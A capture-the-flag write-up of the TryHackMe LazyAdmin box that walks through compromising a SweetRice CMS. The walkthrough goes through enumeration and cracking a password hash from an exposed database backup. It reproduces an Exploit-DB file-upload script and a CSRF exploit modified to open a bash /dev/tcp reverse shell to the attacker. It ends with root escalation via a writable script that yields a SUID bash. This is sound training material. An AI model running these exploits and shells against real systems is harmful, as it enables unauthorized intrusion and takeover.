---
title: LazyAdmin
draft: 
tags:
  - thm
  - oscp
  - easy
---
# Overview/Summary

This box does not have a guided set of questions like some other rooms have. As such, it is entirely blind. The process of exploiting this machine involves a few steps: network Scanning, enumerating the ports found, using gobuster for some directory brute-forcing, discovering the CMS in-use, more directory traversal to discover an exposed backup file of the CMS database to get credentials, logging in with those credentials, discovering the exploit that allows for code execution, using the exploit to get a reverse-shell, then exploiting file permissions to gain root access.

# Initial Scan
```
nmap -Pn -p- -T4 $IP               
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.10.214.227
Host is up (0.18s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 522.67 seconds
```

# Specific Port Scans With Service and OS Enumeration
```
nmap -Pn -p22,80 -sV -sC $IP 
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.10.214.227
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.17 seconds
```

# Enumeration
Since we found port 80 open, we'll open the page in a web browser and do some usual checks, like robots.txt, /admin, and some other browsing of the website like looking at source code.

And we're just hit with the apache default page.
![[LazyAdminApache.png]]

Off to gobuster, we.. go.

```
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.214.227
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/content              (Status: 301) [Size: 316] [--> http://10.10.214.227/content/]
/index.html           (Status: 200) [Size: 11321]
/server-status        (Status: 403) [Size: 278]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```
After this, I kick off another with the big.txt instead of common.

So /content brings us to this page.
![[LazyAdminSweetRiceLanding.png]]

Now we know what CMS is going to be. And the big.txt gobuster scan returned nothing. However, now I'm going to run a gobuster scan on this /content/ directory with the big.txt

```
gobuster dir -u http://$IP/content/ -w /usr/share/wordlists/dirb/big.txt -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.214.227/content/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/_themes              (Status: 301) [Size: 324] [--> http://10.10.214.227/content/_themes/]
/as                   (Status: 301) [Size: 319] [--> http://10.10.214.227/content/as/]
/attachment           (Status: 301) [Size: 327] [--> http://10.10.214.227/content/attachment/]
/images               (Status: 301) [Size: 323] [--> http://10.10.214.227/content/images/]
/inc                  (Status: 301) [Size: 320] [--> http://10.10.214.227/content/inc/]
/js                   (Status: 301) [Size: 319] [--> http://10.10.214.227/content/js/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

This returns a few directories we can check out now as well.

`/content/_themes/` gives us a browsable directory of php files and some css files.

`/content/as/` brings us to a login page. I test with some default credentials.
![[LazyAdminSweetRiceLogin.png]]

admin:admin didn't work and neither did admin:password, but we can brute force this later. There's more directories to check out.

There's a mysql backup found within the `/content/inc/mysql_backup/` directory, found after browsing the `inc` directory.
![[LazyAdminExposedBackupFile.png]]
I wonder if this has the password we're looking for, or at least the hash.

Downloading this file and using `cat` to print it out, there's something that looks like an encoded or hashed password.
```
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;',
  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
```

I'm not good at immediately identifying hash outputs or base64 encoding, so I'll just throw this into cyberchef and see what it says. 

Turns out it's not Base64. I didn't think so. Base64 tends to have special characters in it. So, I take it over to crackstation.

![[LazyAdminHashCracking.png]]

And we have a winner.

However, attempting admin:Password123 doesn't work on the sweetrice login page. Interesting. 

Upon review of the sql output, there's a manager username.

Using manager:Password123 worked!


# Initial Foothold

Now that we have access to the administration page.
#### SearchSploit
```
searchsploit sweetrice 1.5.1
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
SweetRice 1.5.1 - Arbitrary File Download                                                                                  | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                                                                                    | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                                                                                        | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                                                                               | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution                                                          | php/webapps/40700.html
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Let's take a look at the file upload.
#### Getting the exploit file path
```
searchsploit -p php/webapps/40716.py
  Exploit: SweetRice 1.5.1 - Arbitrary File Upload
      URL: https://www.exploit-db.com/exploits/40716
     Path: /usr/share/exploitdb/exploits/php/webapps/40716.py
    Codes: N/A
 Verified: True
File Type: Python script, ASCII text executable
```

#### Reading the exploit
```
cat /usr/share/exploitdb/exploits/php/webapps/40716.py
#/usr/bin/python
#-*- Coding: utf-8 -*-
# Exploit Title: SweetRice 1.5.1 - Unrestricted File Upload
# Exploit Author: Ashiyane Digital Security Team
# Date: 03-11-2016
# Vendor: http://www.basic-cms.org/
# Software Link: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
# Version: 1.5.1
# Platform: WebApp - PHP - Mysql

import requests
import os
from requests import session

if os.name == 'nt':
    os.system('cls')
else:
    os.system('clear')
    pass
banner = '''
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
|  _________                      __ __________.__                  |
| /   _____/_  _  __ ____   _____/  |\______   \__| ____  ____      |
| \_____  \\ \/ \/ // __ \_/ __ \   __\       _/  |/ ___\/ __ \     |
| /        \\     /\  ___/\  ___/|  | |    |   \  \  \__\  ___/     |
|/_______  / \/\_/  \___  >\___  >__| |____|_  /__|\___  >___  >    |
|        \/             \/     \/            \/        \/    \/     |
|    > SweetRice 1.5.1 Unrestricted File Upload                     |
|    > Script Cod3r : Ehsan Hosseini                                |
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
'''

print(banner)


# Get Host & User & Pass & filename
host = input("Enter The Target URL(Example : localhost.com) : ")
username = input("Enter Username : ")
password = input("Enter Password : ")
filename = input("Enter FileName (Example:.htaccess,shell.php5,index.html) : ")
file = {'upload[]': open(filename, 'rb')}

payload = {
    'user':username,
    'passwd':password,
    'rememberMe':''
}



with session() as r:
    login = r.post('http://' + host + '/as/?type=signin', data=payload)
    success = 'Login success'
    if login.status_code == 200:
        print("[+] Sending User&Pass...")
        if login.text.find(success) > 1:
            print("[+] Login Succssfully...")
        else:
            print("[-] User or Pass is incorrent...")
            print("Good Bye...")
            exit()
            pass
        pass
    uploadfile = r.post('http://' + host + '/as/?type=media_center&mode=upload', files=file)
    if uploadfile.status_code == 200:
        print("[+] File Uploaded...")
        print("[+] URL : http://" + host + "/attachment/" + filename)
        pass
```

So this looks like we can run the exploit and it will ask us for the host, a username, password, and what file we want to upload, and it lands in the attachment folder.
Lets quickly craft a php reverse shell, and see if this will work. Otherwise, we can look at other things.
`msfvenom -p php/reverse_php LHOST=10.13.62.120 LPORT=4444 -o test.php`
### Failure to Launch
After running this, it doesn't work. Time to switch gears. There was another exploit with php code execution.
```
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution                                                          | php/webapps/40700.html
```

This html file mentions to upload it via the Ads tab in the sweetrice dashboard, after changing it suit our needs.

```
<!--
# Exploit Title: SweetRice 1.5.1 Arbitrary Code Execution
# Date: 30-11-2016
# Exploit Author: Ashiyane Digital Security Team
# Vendor Homepage: http://www.basic-cms.org/
# Software Link: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
# Version: 1.5.1


# Description :

# In SweetRice CMS Panel In Adding Ads Section SweetRice Allow To Admin Add
PHP Codes In Ads File
# A CSRF Vulnerabilty In Adding Ads Section Allow To Attacker To Execute
PHP Codes On Server .
# In This Exploit I Just Added a echo '<h1> Hacked </h1>'; phpinfo();
Code You Can
Customize Exploit For Your Self .

# Exploit :
-->

<html>
<body onload="document.exploit.submit();">
<form action="http://localhost/sweetrice/as/?type=ad&mode=save" method="POST" name="exploit">
<input type="hidden" name="adk" value="hacked"/>
<textarea type="hidden" name="adv">
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.13.62.120/4444 0>&1'");
?>
</textarea>
</form>
</body>
</html>

<!--
# After HTML File Executed You Can Access Page In
http://localhost/sweetrice/inc/ads/hacked.php
  -->

```

This is how mine looked.

After uploading it, it can be found in
`/content/inc/ads/` through the web browser. 

After starting a netcat session with the matching port in the exploit, we click the link for the what-becomes-a-php file we edited and get a shell!

`whoami` reveals us to be www-data.

# Privilege Escalation
#### Checking sudo privileges
Checking `sudo -l` shows we can run a file in the itguy's directory and `/usr/bin/perl`
Lets check the backup.pl file.
Interesting. We can see we have read and execute on this file.
```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.13.62.120] from (UNKNOWN) [10.10.69.86] 44730
bash: cannot set terminal process group (1056): Inappropriate ioctl for device
bash: no job control in this shell
www-data@THM-Chal:/var/www/html/content/inc/ads$ sudo -l
sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
www-data@THM-Chal:/var/www/html/content/inc/ads$ ls -la /home/itguy/ | grep backup
<html/content/inc/ads$ ls -la /home/itguy/ | grep backup                     
-rw-r--r-x  1 root  root    47 Nov 29  2019 backup.pl
```

Lets check the `/etc/copy.sh` it references.

copy.sh had some gibberish within. We have write privileges on this file, and we know it gets executed as root, thanks to that backup.pl file running as root.

```
www-data@THM-Chal:/etc$ echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" > copy.sh
<o "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" > copy.sh                    
www-data@THM-Chal:/etc$ sudo /usr/bin/perl /home/itguy/backup.pl
sudo /usr/bin/perl /home/itguy/backup.pl
www-data@THM-Chal:/etc$ echo "/tmp/bash -p" > copy.sh
echo "/tmp/bash -p" > copy.sh
www-data@THM-Chal:/etc$ sudo /usr/bin/perl /home/itguy/backup.pl
sudo /usr/bin/perl /home/itguy/backup.pl
whoami
root
cd /root
ls
root.txt
cat root.txt
```